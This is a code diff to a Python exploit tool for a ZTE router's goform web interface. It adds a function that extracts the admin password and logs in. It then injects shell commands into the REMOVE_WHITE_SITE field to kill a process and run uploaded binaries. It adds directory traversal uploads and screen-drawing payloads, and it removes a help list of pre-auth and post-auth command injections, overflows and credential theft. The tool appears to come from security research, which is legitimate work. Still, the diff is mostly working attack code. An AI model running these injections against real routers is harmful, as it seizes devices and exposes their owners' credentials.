@@ -70,6 +70,10 @@ def upload_file(filename, ip):
     info(f"Status Code: {response.status_code}")
     info(f"Response Body: {response.text}")
 
+    if "failure" in response.text:
+        return False
+    return True
+
 
 
 def download_file(url, filename, ip):
@@ -203,7 +207,11 @@ def upload_generic_file(filename, ip):
     info("Entering /tmp directory...")
     print_nice_response(goform_set(GOFORM_HTTPSHARE_ENTERFOLD("/mmc2/../../../../../../tmp", "1"), ip))
     info(f"Uploading {filename.split('/')[-1]}...")
-    upload_file(filename, ip)
+    while True:
+        if upload_file(filename, ip):
+            break
+        else:
+            info("Upload failed - trying again")
 
 
 def overwrite_qr_code(ip):
@@ -236,40 +244,16 @@ def goform_get(cmd, ip):
     info(f"Response Body: {response.text}")
     
 
-def print_help():
-    entries = [
-        ["-h", "Display help"],
-        ["-enable_telnet", "\033[34m[UTIL]\033[0m Uses a command injection to enable telnet"],
-        ["-enterfold", "\033[34m[UTIL]\033[0m Uses directory traversal to ls directories"],
-        ["-upload_gdb", "\033[34m[UTIL]\033[0m Uses file write to upload gdbserver to /tmp"],
-        ["-goform_get [cmd]", "\033[34m[UTIL]\033[0m Do goform GET request with specified command"],
-        ["-arb_config_clear [name]", "\033[34m[PoC]\033[0m Pre-auth command injection PoC for goform "],
-        ["-PINT_DIAGNOSTICS_START_inj", "\033[34m[PoC]\033[0m Post-auth command injection for PINT_DIAGNOSTICS_START"],
-        ["-ADD_WHITE_SITE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for ADD_WHITE_SITE"],
-        ["-REMOVE_WHITE_SITE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for REMOVE_WHITE_SITE"],
-        ["-REMOVE_WHITE_SITE_overflow", "\033[34m[PoC]\033[0m Post-auth stack overflow for REMOVE_WHITE_SITE (in zte_mainctrl)"],
-        ["-DEL_DEVICE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for DEL_DEVICE"],
-        ["-ADD_DEVICE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for ADD_DEVICE"],
-        ["-BIND_STATIC_ADDRESS_DEL_inj", "\033[34m[PoC]\033[0m Post-auth command injection for BIND_STATIC_ADDRESS_DEL"],
-        ["-BIND_STATIC_ADDRESS_ADD_inj", "\033[34m[PoC]\033[0m Post-auth command injection for BIND_STATIC_ADDRESS_ADD"],
-        ["-EDIT_HOSTNAME_inj", "\033[34m[PoC]\033[0m Post-auth command injection for EDIT_HOSTNAME"],
-        ["-DMZ_SETTING_inj", "\033[34m[PoC]\033[0m Post-auth command injection for DMZ_SETTING"],
-        ["-STATIC_DHCP_SETTING_inj", "\033[34m[PoC]\033[0m Post-auth command injection for STATIC_DHCP_SETTING"],
-        ["-URL_FILTER_ADD_inj", "\033[34m[PoC]\033[0m Post-auth command injection for URL_FILTER_ADD"],
-        ["-CHANGE_MAC_overflow", "\033[34m[PoC]\033[0m Post-auth stack overflow in CHANGE_MAC"],
-        ["-GOFORM_DELETE_SMS_crash", "\033[34m[PoC]\033[0m Post-auth crash in GOFORM_DELETE_SMS"],
-        ["-GOFORM_MOVE_TO_SIM_crash", "\033[34m[PoC]\033[0m Post-auth crash in GOFORM_MOVE_TO_SIM"],
-        ["-get_admin_pwd", "\033[34m[EXPLOIT]\033[0m Uses pre-auth file rename to extract config, then admin password"],
-        ["-overwrite_qr_code", "\033[34m[EXPLOIT]\033[0m Uses pre-auth file write to overwrite QR code displayed"],
-        ["-flappy", "\033[34m[EXPLOIT]\033[0m Chain auth bypass, file write, and command injection to play flappy bird"],
-    ]
-
-    info("Help:")
-    
-    for entry in entries:
-        cmd_length = len(entry[0])
-        print(f"\033[95m    {entry[0]}\033[0m{' ' * (40-cmd_length)}{entry[1]}")
-
+def run_on_screen(router_ip, to_run, argument=''):
+    admin_pwd = get_admin_password(router_ip)
+    info(f"Logging in with admin password: {admin_pwd}")
+    print()
+    goform_set(GOFORM_LOGIN(admin_pwd), router_ip)
+    goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; kill $(ps | grep zte_mmi | grep -v grep | awk '{print $1}') #"), router_ip)
+    if len(argument) > 0:
+        goform_set(GOFORM_REMOVE_WHITE_SITE(f"test\" ; chmod +x {to_run} ; {to_run} {argument} #"), router_ip)
+    else:
+        goform_set(GOFORM_REMOVE_WHITE_SITE(f"test\" ; chmod +x {to_run} ; {to_run} #"), router_ip)
 
 def main():
     print_ascii_art()
@@ -306,6 +290,22 @@ def main():
     # define parser for overwrite_qr_code command
     overwrite_qr_code_parser = subparsers.add_parser('overwrite_qr_code', 
                     help='Uses pre-auth file write to overwrite the wifi creds qr code')
+
+    # define parse for screen_run command
+    screen_run_parser = subparsers.add_parser('screen_run', 
+                    help='Demonstrates running our own code to mess with the screen')
+
+    # define screen run subparser for displaying static images
+    screen_run_subparsers = screen_run_parser.add_subparsers(dest='type', help='Available functions')
+    screen_run_mandelbrot_parser = screen_run_subparsers.add_parser('mandelbrot', 
+                    help='Visualises mandelbrot on the router')
+    screen_run_graphics_parser = screen_run_subparsers.add_parser('graphics', 
+                    help='Example of common graphics primitives on the screen')
+    screen_run_draw_image_parser = screen_run_subparsers.add_parser('draw_image', 
+                    help='Draws a .rgb image on the screen')
+    screen_run_draw_image_parser.add_argument("filename",
+                    type=str,
+                    help="Name of the file you wish to upload and display")
 
     # define parser for flappy command
     flappy_parser = subparsers.add_parser('flappy', 
@@ -409,12 +409,22 @@ def main():
         print()
         upload_generic_file("Payloads/Flappy/flappy", arguments.router_ip)
         print()
-        admin_pwd = get_admin_password(arguments.router_ip)
-        info(f"Logging in with admin password: {admin_pwd}")
-        print()
-        goform_set(GOFORM_LOGIN(admin_pwd), arguments.router_ip)
-        goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; kill $(ps | grep zte_mmi | grep -v grep | awk '{print $1}') #"), arguments.router_ip)
-        goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; chmod +x /tmp/flappy ; /tmp/flappy #"), arguments.router_ip)
+        run_on_screen(arguments.router_ip, "/tmp/flappy")
+    elif (arguments.command == 'screen_run'):
+        if (arguments.type == 'mandelbrot'):
+            upload_generic_file("Payloads/Mandelbrot/mandelbrot", arguments.router_ip)
+            print()
+            run_on_screen(arguments.router_ip, "/tmp/mandelbrot")
+        elif (arguments.type == 'graphics'):
+            upload_generic_file("Payloads/Graphics/graphics", arguments.router_ip)
+            print()
+            run_on_screen(arguments.router_ip, "/tmp/graphics")
+        if (arguments.type == 'draw_image'):
+            upload_generic_file("Payloads/DrawImage/draw_image", arguments.router_ip)
+            print()
+            upload_generic_file(arguments.filename, arguments.router_ip)
+            print()
+            run_on_screen(arguments.router_ip, "/tmp/draw_image", "/tmp/" + arguments.filename.split('/')[-1])
     elif (arguments.command == 'PINT_DIAGNOSTICS_START_inj'):
         goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
         goform_set(GOFORM_PINT_DIAGNOSTICS_START("127.0.0.1", "1", "1", "1", "eth0 ; reboot ;"), arguments.router_ip)
